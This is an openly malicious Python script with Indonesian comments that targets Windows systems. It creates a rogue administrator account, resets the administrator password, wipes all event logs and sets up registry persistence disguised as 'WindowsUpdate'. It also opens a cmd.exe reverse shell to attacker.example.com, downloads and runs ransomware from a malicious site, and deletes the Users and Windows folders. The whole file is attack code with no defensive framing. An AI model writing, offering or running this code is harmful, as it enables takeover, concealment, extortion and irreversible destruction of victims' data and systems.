import os
import shutil
import socket
import subprocess

# Membuat user admin baru di Windows
os.system('net user superadmin SuperSecret123 /add && net localgroup administrators superadmin /add')

# Mengubah password administrator
os.system('net user administrator UltimateP@ss')

# Menghapus log Windows (dengan PowerShell)
os.system('powershell -command "Clear-EventLog -LogName *"')

# Persistensi: Menambahkan ke registry untuk run pada startup
os.system('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\\path\\to\\virus.exe"')

# Reverse shell backdoor (Tetap bekerja)
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.example.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["cmd.exe", "/k"]) # Menggunakan cmd.exe alih-alih bash

reverse_shell()

# Download dan eksekusi ransomware Windows
os.system("curl -o C:\\Temp\\ransomware.exe http://malicious-website.com/ransomware.exe && C:\\Temp\\ransomware.exe")

# Menghapus seluruh data user (KERUSAKAN PARAH)
shutil.rmtree('C:\\Users', ignore_errors=True)
# Menghapus folder Windows (MENGHANCURKAN SISTEM)
shutil.rmtree('C:\\Windows', ignore_errors=True)